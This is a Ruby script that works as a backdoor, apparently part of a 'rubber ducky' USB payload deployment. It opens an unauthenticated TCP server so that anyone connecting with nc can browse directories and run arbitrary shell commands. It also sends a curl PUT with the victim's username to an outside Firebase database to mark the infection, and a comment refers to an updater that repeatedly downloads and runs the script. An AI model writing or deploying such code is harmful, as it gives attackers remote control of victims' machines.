# opens a tcp server on host computer
# usage: ruby server.rb <host> <port>
# to connect to server: nc <host> <port>

begin
  require 'socket'
rescue LoadError
    # if gem is not installed
  system('gem install net-ssh')
  require 'socket'
end

def print_dir(client)
    client.puts "Current Dir: #{Dir.pwd().gsub("#{ENV['HOME']}", '~')}"
end

def handle_input(command, args, client)
    if command == 'cd'
        begin
            cd(args: args)
        rescue StandardError => e
            client.puts "Invalid Dir: #{e}"
        else
            print_dir(client)
        end
    
    elsif ['cls', 'clear'].include?(command)
        clear(client)
    
    elsif command == 'ls'
        Dir.entries(Dir.pwd()).each do |file|
            client.puts file
        end

    elsif command == 'shell'
        shell(args[0])
    
    elsif command == 'exit'
        client.close
        exit 0
    
    else
        client.puts "Invalid Command"
    end
end

def clear(client)
    for i in 0..100
        client.puts "\n"
    end

    client.puts "Welcome to #{ENV['USER']}"
    client.puts print_dir(client)
end

def cd(args: [])
    if args.empty?
        Dir.chdir(ENV['HOME'])
        return
    end

    case args[0][0]
    when '/'
        Dir.chdir(args[0])
        return
    when '~'
        args[0] = args[0].gsub('~', ENV['HOME'])

        Dir.chdir(args[0])
        return
    when '../'
        Dir.chdir("#{Dir.pwd()}/..")
    else
        Dir.chdir("#{Dir.pwd()}/#{args[0]}")
    end
end

def shell(command)
    system(command)
end

def main()
    server = TCPServer.new(ARGV[0], ARGV[1])

    loop do
        # Wait for a client to connect
        client = server.accept

        clear(client)

        client.puts "Welcome to #{ENV['USER']}!"

        print_dir(client)

        # Handle client input
        while line = client.gets
            input = line.chomp.split(' ') # removes trailing newline (\n)
            
            begin
                handle_input(input[0], input[1..], client)
            rescue StandardError => e
                client.puts "Invalid Command"
            end
        end

        # exit
    end
end

# otherwise while the server is up, updater.sh will continue to download and run 3_main.rb, making multiple servers
system("curl -X PUT -d 'true' https://rc-rubber-ducky-deploy-default-rtdb.asia-southeast1.firebasedatabase.app/users/#{ENV['USER']}/executed.json")

main()

